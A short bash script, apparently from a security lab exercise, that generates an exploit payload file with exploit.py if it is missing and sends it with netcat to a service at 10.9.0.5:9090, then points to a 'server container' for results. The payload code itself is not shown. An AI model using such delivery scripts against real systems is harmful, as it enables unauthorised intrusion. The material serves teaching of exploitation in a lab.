#!/bin/bash
set -e

if [ ! -f "badfile" ]; then
    echo "Generating payload..."
    python3 exploit.py
fi

echo "Sending payload to 10.9.0.5:9090..."
cat badfile | nc 10.9.0.5 9090
echo "Done. Check server container output for results."
